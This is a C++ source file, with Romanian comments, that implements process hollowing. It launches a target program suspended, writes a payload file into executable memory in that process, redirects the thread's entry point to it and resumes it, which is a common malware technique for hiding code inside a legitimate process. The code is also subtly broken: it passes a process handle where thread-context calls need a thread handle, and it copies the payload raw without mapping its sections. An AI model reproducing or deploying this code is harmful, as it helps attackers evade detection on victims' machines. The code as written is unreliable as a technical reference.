#include <Windows.h>
#include <iostream>
#include <string>

namespace ShadowToken {

    class ProcessHollower {
    public:
        // Hollowing pe un proces specificat prin path-ul executabilului și payload-ul de injectat
        bool PerformProcessHollowing(const std::wstring& targetPath, const std::wstring& payloadPath) {
            STARTUPINFO si = { sizeof(si) };
            PROCESS_INFORMATION pi;

            // Crearea procesului țintă într-o stare suspendată
            if (!CreateProcess(targetPath.c_str(), nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
                std::cerr << "[Error] Nu s-a putut crea procesul țintă: " << GetLastError() << std::endl;
                return false;
            }

            // Înlocuirea secțiunii de cod cu payload-ul
            if (!HollowProcess(pi.hProcess, payloadPath)) {
                TerminateProcess(pi.hProcess, 1);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return false;
            }

            // Reluarea execuției procesului cu codul injectat
            ResumeThread(pi.hThread);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            std::cout << "[Info] Process Hollowing a fost realizat cu succes." << std::endl;
            return true;
        }

    private:
        // Încărcarea payload-ului în procesul suspendat
        bool HollowProcess(HANDLE processHandle, const std::wstring& payloadPath) {
            // Deschideți payload-ul ca fișier
            HANDLE payloadFile = CreateFile(payloadPath.c_str(), GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (payloadFile == INVALID_HANDLE_VALUE) {
                std::cerr << "[Error] Nu s-a putut deschide payload-ul: " << GetLastError() << std::endl;
                return false;
            }

            DWORD payloadSize = GetFileSize(payloadFile, nullptr);
            BYTE* payloadBuffer = new BYTE[payloadSize];

            DWORD bytesRead;
            if (!ReadFile(payloadFile, payloadBuffer, payloadSize, &bytesRead, nullptr)) {
                std::cerr << "[Error] Nu s-a putut citi payload-ul: " << GetLastError() << std::endl;
                delete[] payloadBuffer;
                CloseHandle(payloadFile);
                return false;
            }
            CloseHandle(payloadFile);

            // Găsește secțiunea de cod a procesului țintă
            CONTEXT ctx = { 0 };
            ctx.ContextFlags = CONTEXT_FULL;
            if (!GetThreadContext(processHandle, &ctx)) {
                std::cerr << "[Error] Nu s-a putut obține contextul thread-ului." << std::endl;
                delete[] payloadBuffer;
                return false;
            }

            // Scrie payload-ul în memoria procesului țintă
            LPVOID remoteImageBase = VirtualAllocEx(processHandle, nullptr, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!remoteImageBase || !WriteProcessMemory(processHandle, remoteImageBase, payloadBuffer, payloadSize, nullptr)) {
                std::cerr << "[Error] Nu s-a putut scrie payload-ul în memoria procesului țintă." << std::endl;
                delete[] payloadBuffer;
                return false;
            }

            // Setează noul punct de intrare
            ctx.Eax = (DWORD)remoteImageBase;
            if (!SetThreadContext(processHandle, &ctx)) {
                std::cerr << "[Error] Nu s-a putut seta contextul thread-ului." << std::endl;
                delete[] payloadBuffer;
                return false;
            }

            delete[] payloadBuffer;
            return true;
        }
    };
}
